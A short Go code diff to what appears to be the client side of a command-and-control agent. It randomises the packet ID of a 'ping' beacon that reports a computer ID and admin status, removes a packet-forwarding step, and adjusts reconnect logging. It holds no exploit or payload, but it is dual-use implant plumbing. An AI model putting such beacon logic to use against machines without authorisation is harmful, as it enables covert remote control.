@@ -1,6 +1,7 @@
 package client
 
 import (
+	"math/rand"
 	"strconv"
 	"time"
 
@@ -52,11 +53,7 @@ func (d *UpstreamManager) Connect() error {
 
 			case packet, connected = <-d.UpstreamHttp.ChanIncoming():
 			}
-
 			d.Channel <- packet
-
-			packet = <-d.Channel
-			d.UpstreamWs.ChanOutgoing() <- packet
 		}
 	}()
 
@@ -68,7 +65,7 @@ func (d *UpstreamManager) Reconnect() {
 	// Throw away old UpstreamWs, and try to connect again
 	upstreamWs := MakeUpstreamWs(d.config, d.campaign)
 	d.UpstreamWs = &upstreamWs
-	log.Infof("Upstream websocket disconnectd")
+	log.Infof("Upstream websocket disconnectd. Retrying...")
 	d.Connect2()
 }
 
@@ -93,7 +90,7 @@ func (d *UpstreamManager) Connect2() error {
 			}
 		}
 
-		log.Info("Could not connect, sleeping...")
+		log.Debug("Could not connect, sleeping...")
 		time.Sleep(time.Second * 3)
 	}
 
@@ -131,13 +128,6 @@ func (d *UpstreamManager) sendPing() {
 		response["isAdmin"] = strconv.FormatBool(isAdmin)
 	}
 
-	packet := model.NewPacket("ping", d.config.ComputerId, "0", arguments, response)
+	packet := model.NewPacket("ping", d.config.ComputerId, strconv.Itoa(int(rand.Uint64())), arguments, response)
 	d.SendOutofband(packet)
-	/*for {
-		err := c.UpstreamManager.SendOutofband(packet)
-		if err == nil {
-			break // when no error -> success
-		}
-		time.Sleep(time.Minute * 10) // 10mins for now
-	}*/
 }
